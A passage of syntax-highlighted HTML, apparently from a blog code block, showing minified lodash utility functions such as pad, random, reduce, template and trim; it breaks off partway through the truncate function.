class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">mean</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Me</span>(t, <span class="title class_">Wc</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">meanBy</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Me</span>(t, <span class="title class_">Qi</span>(e, <span class="number">2</span>))</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">min</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t &amp;&amp; t.<span class="property">length</span> ? <span class="title function_">ir</span>(t, <span class="title class_">Wc</span>, <span class="title class_">Hr</span>) : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">minBy</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t &amp;&amp; t.<span class="property">length</span> ? <span class="title function_">ir</span>(t, <span class="title class_">Qi</span>(e, <span class="number">2</span>), <span class="title class_">Hr</span>) : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">stubArray</span> = os,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">stubFalse</span> = <span class="keyword">as</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">stubObject</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">stubString</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">stubTrue</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> !<span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">multiply</span> = fs,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">nth</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t &amp;&amp; t.<span class="property">length</span> ? <span class="title function_">kr</span>(t, <span class="title function_">ic</span>(e)) : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">noConflict</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Wt</span>.<span class="property">_</span> === <span class="variable language_">this</span> &amp;&amp; (<span class="title class_">Wt</span>.<span class="property">_</span> = <span class="title class_">Tt</span>),</span><br><span class="line">                                        <span class="variable language_">this</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">noop</span> = <span class="title class_">Jc</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">now</span> = ma,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">pad</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    t = <span class="title function_">sc</span>(t);</span><br><span class="line">                                    <span class="keyword">var</span> r = (e = <span class="title function_">ic</span>(e)) ? <span class="title class_">Ye</span>(t) : <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (!e || r &gt;= e)</span><br><span class="line">                                        <span class="keyword">return</span> t;</span><br><span class="line">                                    <span class="keyword">var</span> i = (e - r) / <span class="number">2</span>;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Li</span>(<span class="title function_">tn</span>(i), n) + t + <span class="title class_">Li</span>(<span class="title class_">Ke</span>(i), n)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">padEnd</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    t = <span class="title function_">sc</span>(t);</span><br><span class="line">                                    <span class="keyword">var</span> r = (e = <span class="title function_">ic</span>(e)) ? <span class="title class_">Ye</span>(t) : <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">return</span> e &amp;&amp; r &lt; e ? t + <span class="title class_">Li</span>(e - r, n) : t</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">padStart</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    t = <span class="title function_">sc</span>(t);</span><br><span class="line">                                    <span class="keyword">var</span> r = (e = <span class="title function_">ic</span>(e)) ? <span class="title class_">Ye</span>(t) : <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">return</span> e &amp;&amp; r &lt; e ? <span class="title class_">Li</span>(e - r, n) + t : t</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">parseInt</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> n || <span class="literal">null</span> == e ? e = <span class="number">0</span> : e &amp;&amp; (e = +e),</span><br><span class="line">                                        <span class="title function_">ln</span>(<span class="title function_">sc</span>(t).<span class="title function_">replace</span>(X, <span class="string">&quot;&quot;</span>), e || <span class="number">0</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">random</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (n &amp;&amp; <span class="string">&quot;boolean&quot;</span> != <span class="keyword">typeof</span> n &amp;&amp; <span class="title function_">so</span>(t, e, n) &amp;&amp; (e = n = <span class="keyword">void</span> <span class="number">0</span>),</span><br><span class="line">                                    <span class="keyword">void</span> <span class="number">0</span> === n &amp;&amp; (<span class="string">&quot;boolean&quot;</span> == <span class="keyword">typeof</span> e ? (n = e,</span><br><span class="line">                                        e = <span class="keyword">void</span> <span class="number">0</span>) : <span class="string">&quot;boolean&quot;</span> == <span class="keyword">typeof</span> t &amp;&amp; (n = t,</span><br><span class="line">                                        t = <span class="keyword">void</span> <span class="number">0</span>)),</span><br><span class="line">                                        <span class="keyword">void</span> <span class="number">0</span> === t &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> === e ? (t = <span class="number">0</span>,</span><br><span class="line">                                            e = <span class="number">1</span>) : (t = <span class="title function_">rc</span>(t),</span><br><span class="line">                                            <span class="keyword">void</span> <span class="number">0</span> === e ? (e = t,</span><br><span class="line">                                                t = <span class="number">0</span>) : e = <span class="title function_">rc</span>(e)),</span><br><span class="line">                                    t &gt; e) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> r = t;</span><br><span class="line">                                        t = e,</span><br><span class="line">                                            e = r</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">if</span> (n || t % <span class="number">1</span> || e % <span class="number">1</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> i = <span class="title function_">hn</span>();</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">sn</span>(t + i * (e - t + <span class="title class_">Bt</span>(<span class="string">&quot;1e-&quot;</span> + ((i + <span class="string">&quot;&quot;</span>).<span class="property">length</span> - <span class="number">1</span>))), e)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Fr</span>(t, e)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">reduce</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title class_">Va</span>(t) ? ve : <span class="title class_">He</span></span><br><span class="line">                                        , i = <span class="variable language_">arguments</span>.<span class="property">length</span> &lt; <span class="number">3</span>;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">r</span>(t, <span class="title class_">Qi</span>(e, <span class="number">4</span>), n, i, er)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">reduceRight</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title class_">Va</span>(t) ? me : <span class="title class_">He</span></span><br><span class="line">                                        , i = <span class="variable language_">arguments</span>.<span class="property">length</span> &lt; <span class="number">3</span>;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">r</span>(t, <span class="title class_">Qi</span>(e, <span class="number">4</span>), n, i, nr)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">repeat</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> e = (n ? <span class="title function_">so</span>(t, e, n) : <span class="keyword">void</span> <span class="number">0</span> === e) ? <span class="number">1</span> : <span class="title function_">ic</span>(e),</span><br><span class="line">                                        <span class="title class_">Dr</span>(<span class="title function_">sc</span>(t), e)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">replace</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> t = <span class="variable language_">arguments</span></span><br><span class="line">                                        , e = <span class="title function_">sc</span>(t[<span class="number">0</span>]);</span><br><span class="line">                                    <span class="keyword">return</span> t.<span class="property">length</span> &lt; <span class="number">3</span> ? e : e.<span class="title function_">replace</span>(t[<span class="number">1</span>], t[<span class="number">2</span>])</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">result</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = -<span class="number">1</span></span><br><span class="line">                                        , i = (e = <span class="title function_">si</span>(e, t)).<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">for</span> (i || (i = <span class="number">1</span>,</span><br><span class="line">                                        t = <span class="keyword">void</span> <span class="number">0</span>); ++r &lt; i;) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> o = <span class="literal">null</span> == t ? <span class="keyword">void</span> <span class="number">0</span> : t[<span class="title class_">Ho</span>(e[r])];</span><br><span class="line">                                        <span class="keyword">void</span> <span class="number">0</span> === o &amp;&amp; (r = i,</span><br><span class="line">                                            o = n),</span><br><span class="line">                                            t = <span class="title class_">Ia</span>(o) ? o.<span class="title function_">call</span>(t) : o</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> t</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">round</span> = ds,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">runInContext</span> = t,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sample</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> (<span class="title class_">Va</span>(t) ? <span class="title class_">Rn</span> : <span class="title class_">Rr</span>)(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">size</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="literal">null</span> == t)</span><br><span class="line">                                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="title function_">ja</span>(t))</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Qa</span>(t) ? <span class="title class_">Ye</span>(t) : t.<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="title function_">ro</span>(t);</span><br><span class="line">                                    <span class="keyword">return</span> e == v || e == b ? t.<span class="property">size</span> : <span class="title class_">Sr</span>(t).<span class="property">length</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">snakeCase</span> = <span class="title class_">Fc</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">some</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title class_">Va</span>(t) ? ge : <span class="title class_">Wr</span>;</span><br><span class="line">                                    <span class="keyword">return</span> n &amp;&amp; <span class="title function_">so</span>(t, e, n) &amp;&amp; (e = <span class="keyword">void</span> <span class="number">0</span>),</span><br><span class="line">                                        <span class="title function_">r</span>(t, <span class="title class_">Qi</span>(e, <span class="number">3</span>))</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sortedIndex</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Xr</span>(t, e)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sortedIndexBy</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Gr</span>(t, e, <span class="title class_">Qi</span>(n, <span class="number">2</span>))</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sortedIndexOf</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (n) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> r = <span class="title class_">Xr</span>(t, e);</span><br><span class="line">                                        <span class="keyword">if</span> (r &lt; n &amp;&amp; <span class="title class_">Oa</span>(t[r], e))</span><br><span class="line">                                            <span class="keyword">return</span> r</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sortedLastIndex</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Xr</span>(t, e, !<span class="number">0</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sortedLastIndexBy</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Gr</span>(t, e, <span class="title class_">Qi</span>(n, <span class="number">2</span>), !<span class="number">0</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sortedLastIndexOf</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = <span class="title class_">Xr</span>(t, e, !<span class="number">0</span>) - <span class="number">1</span>;</span><br><span class="line">                                        <span class="keyword">if</span> (<span class="title class_">Oa</span>(t[n], e))</span><br><span class="line">                                            <span class="keyword">return</span> n</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">startCase</span> = <span class="title class_">Dc</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">startsWith</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t = <span class="title function_">sc</span>(t),</span><br><span class="line">                                        n = <span class="literal">null</span> == n ? <span class="number">0</span> : <span class="title class_">Zn</span>(<span class="title function_">ic</span>(n), <span class="number">0</span>, t.<span class="property">length</span>),</span><br><span class="line">                                        e = <span class="title class_">Jr</span>(e),</span><br><span class="line">                                    t.<span class="title function_">slice</span>(n, n + e.<span class="property">length</span>) == e</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">subtract</span> = ps,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sum</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t &amp;&amp; t.<span class="property">length</span> ? <span class="title class_">Te</span>(t, <span class="title class_">Wc</span>) : <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">sumBy</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t &amp;&amp; t.<span class="property">length</span> ? <span class="title class_">Te</span>(t, <span class="title class_">Qi</span>(e, <span class="number">2</span>)) : <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">template</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title class_">An</span>.<span class="property">templateSettings</span>;</span><br><span class="line">                                    n &amp;&amp; <span class="title function_">so</span>(t, e, n) &amp;&amp; (e = <span class="keyword">void</span> <span class="number">0</span>),</span><br><span class="line">                                        t = <span class="title function_">sc</span>(t),</span><br><span class="line">                                        e = <span class="title function_">hc</span>(&#123;&#125;, e, r, <span class="title class_">Ii</span>);</span><br><span class="line">                                    <span class="keyword">var</span> i, o, a = <span class="title function_">hc</span>(&#123;&#125;, e.<span class="property">imports</span>, r.<span class="property">imports</span>, <span class="title class_">Ii</span>), c = <span class="title function_">_c</span>(a), s = <span class="title function_">ke</span>(a, c), u = <span class="number">0</span>,</span><br><span class="line">                                        l = e.<span class="property">interpolate</span> || lt, h = <span class="string">&quot;__p += &#x27;&quot;</span>,</span><br><span class="line">                                        f = <span class="title function_">vt</span>((e.<span class="property">escape</span> || lt).<span class="property">source</span> + <span class="string">&quot;|&quot;</span> + l.<span class="property">source</span> + <span class="string">&quot;|&quot;</span> + (l === $ ? nt : lt).<span class="property">source</span> + <span class="string">&quot;|&quot;</span> + (e.<span class="property">evaluate</span> || lt).<span class="property">source</span> + <span class="string">&quot;|$&quot;</span>, <span class="string">&quot;g&quot;</span>),</span><br><span class="line">                                        d = <span class="string">&quot;//# sourceURL=&quot;</span> + (zt.<span class="title function_">call</span>(e, <span class="string">&quot;sourceURL&quot;</span>) ? (e.<span class="property">sourceURL</span> + <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/\s/g</span>, <span class="string">&quot; &quot;</span>) : <span class="string">&quot;lodash.templateSources[&quot;</span> + ++<span class="title class_">Nt</span> + <span class="string">&quot;]&quot;</span>) + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                                    t.<span class="title function_">replace</span>(f, (<span class="keyword">function</span> (<span class="params">e, n, r, a, c, s</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> r || (r = a),</span><br><span class="line">                                                h += t.<span class="title function_">slice</span>(u, s).<span class="title function_">replace</span>(ht, <span class="title class_">Ne</span>),</span><br><span class="line">                                            n &amp;&amp; (i = !<span class="number">0</span>,</span><br><span class="line">                                                h += <span class="string">&quot;&#x27; +\n__e(&quot;</span> + n + <span class="string">&quot;) +\n&#x27;&quot;</span>),</span><br><span class="line">                                            c &amp;&amp; (o = !<span class="number">0</span>,</span><br><span class="line">                                                h += <span class="string">&quot;&#x27;;\n&quot;</span> + c + <span class="string">&quot;;\n__p += &#x27;&quot;</span>),</span><br><span class="line">                                            r &amp;&amp; (h += <span class="string">&quot;&#x27; +\n((__t = (&quot;</span> + r + <span class="string">&quot;)) == null ? &#x27;&#x27; : __t) +\n&#x27;&quot;</span>),</span><br><span class="line">                                                u = s + e.<span class="property">length</span>,</span><br><span class="line">                                                e</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    )),</span><br><span class="line">                                        h += <span class="string">&quot;&#x27;;\n&quot;</span>;</span><br><span class="line">                                    <span class="keyword">var</span> p = zt.<span class="title function_">call</span>(e, <span class="string">&quot;variable&quot;</span>) &amp;&amp; e.<span class="property">variable</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (p) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (tt.<span class="title function_">test</span>(p))</span><br><span class="line">                                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">G</span>(<span class="string">&quot;Invalid `variable` option passed into `_.template`&quot;</span>)</span><br><span class="line">                                    &#125; <span class="keyword">else</span></span><br><span class="line">                                        h = <span class="string">&quot;with (obj) &#123;\n&quot;</span> + h + <span class="string">&quot;\n&#125;\n&quot;</span>;</span><br><span class="line">                                    h = (o ? h.<span class="title function_">replace</span>(L, <span class="string">&quot;&quot;</span>) : h).<span class="title function_">replace</span>(V, <span class="string">&quot;$1&quot;</span>).<span class="title function_">replace</span>(P, <span class="string">&quot;$1;&quot;</span>),</span><br><span class="line">                                        h = <span class="string">&quot;function(&quot;</span> + (p || <span class="string">&quot;obj&quot;</span>) + <span class="string">&quot;) &#123;\n&quot;</span> + (p ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;obj || (obj = &#123;&#125;);\n&quot;</span>) + <span class="string">&quot;var __t, __p = &#x27;&#x27;&quot;</span> + (i ? <span class="string">&quot;, __e = _.escape&quot;</span> : <span class="string">&quot;&quot;</span>) + (o ? <span class="string">&quot;, __j = Array.prototype.join;\nfunction print() &#123; __p += __j.call(arguments, &#x27;&#x27;) &#125;\n&quot;</span> : <span class="string">&quot;;\n&quot;</span>) + h + <span class="string">&quot;return __p\n&#125;&quot;</span>;</span><br><span class="line">                                    <span class="keyword">var</span> v = $c((<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="title function_">ft</span>(c, d + <span class="string">&quot;return &quot;</span> + h).<span class="title function_">apply</span>(<span class="keyword">void</span> <span class="number">0</span>, s)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    ));</span><br><span class="line">                                    <span class="keyword">if</span> (v.<span class="property">source</span> = h,</span><br><span class="line">                                        <span class="title class_">Ra</span>(v))</span><br><span class="line">                                        <span class="keyword">throw</span> v;</span><br><span class="line">                                    <span class="keyword">return</span> v</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">times</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((t = <span class="title function_">ic</span>(t)) &lt; <span class="number">1</span> || t &gt; <span class="number">9007199254740991</span>)</span><br><span class="line">                                        <span class="keyword">return</span> [];</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="number">4294967295</span></span><br><span class="line">                                        , r = <span class="title function_">sn</span>(t, <span class="number">4294967295</span>);</span><br><span class="line">                                    t -= <span class="number">4294967295</span>;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="title class_">Ae</span>(r, e = <span class="title class_">Qi</span>(e)); ++n &lt; t;)</span><br><span class="line">                                        <span class="title function_">e</span>(n);</span><br><span class="line">                                    <span class="keyword">return</span> i</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toFinite</span> = rc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toInteger</span> = ic,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toLength</span> = oc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toLower</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">sc</span>(t).<span class="title function_">toLowerCase</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toNumber</span> = ac,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toSafeInteger</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t ? <span class="title class_">Zn</span>(<span class="title function_">ic</span>(t), -<span class="number">9007199254740991</span>, <span class="number">9007199254740991</span>) : <span class="number">0</span> === t ? t : <span class="number">0</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toString</span> = sc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">toUpper</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">sc</span>(t).<span class="title function_">toUpperCase</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">trim</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((t = <span class="title function_">sc</span>(t)) &amp;&amp; (n || <span class="keyword">void</span> <span class="number">0</span> === e))</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Oe</span>(t);</span><br><span class="line">                                    <span class="keyword">if</span> (!t || !(e = <span class="title class_">Jr</span>(e)))</span><br><span class="line">                                        <span class="keyword">return</span> t;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title class_">We</span>(t)</span><br><span class="line">                                        , i = <span class="title class_">We</span>(e);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">li</span>(r, <span class="title class_">Ve</span>(r, i), <span class="title class_">Pe</span>(r, i) + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">trimEnd</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((t = <span class="title function_">sc</span>(t)) &amp;&amp; (n || <span class="keyword">void</span> <span class="number">0</span> === e))</span><br><span class="line">                                        <span class="keyword">return</span> t.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="title class_">Xe</span>(t) + <span class="number">1</span>);</span><br><span class="line">                                    <span class="keyword">if</span> (!t || !(e = <span class="title class_">Jr</span>(e)))</span><br><span class="line">                                        <span class="keyword">return</span> t;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title class_">We</span>(t);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">li</span>(r, <span class="number">0</span>, <span class="title class_">Pe</span>(r, <span class="title class_">We</span>(e)) + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">trimStart</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((t = <span class="title function_">sc</span>(t)) &amp;&amp; (n || <span class="keyword">void</span> <span class="number">0</span> === e))</span><br><span class="line">                                        <span class="keyword">return</span> t.<span class="title function_">replace</span>(X, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                                    <span class="keyword">if</span> (!t || !(e = <span class="title class_">Jr</span>(e)))</span><br><span class="line">                                        <span class="keyword">return</span> t;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="title class_">We</span>(t);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">li</span>(r, <span class="title class_">Ve</span>(r, <span class="title class_">We</span>(e))).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">truncate</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="number">30</span></span><br><span class="line">                                        , r = <span class="string">&quot;...&quot;</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="title class_">Ua</span>(e)) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> i = <span class="string">&quot;separator&quot;</span> <span class="keyword">in</span> e ? e.<span class="property">separator</span> : i;</span><br><span class="line">                                        n = <span class="string">&quot;length&quot;</span> <span class="keyword">in</span> e ? <span class="title function_">ic</span>(e.<span class="property">length</span>) : n,</span><br><span class="line">                                            r = <span class="string">&quot;omission&quot;</span> <span class="keyword">in</span> e ? <span class="title class_">Jr</span>(e.<span class="property">omission</span>) : r</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">var</span> o = (t = <span class="title function_">sc</span>(t)).<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="title class_">Re</span>(t)) 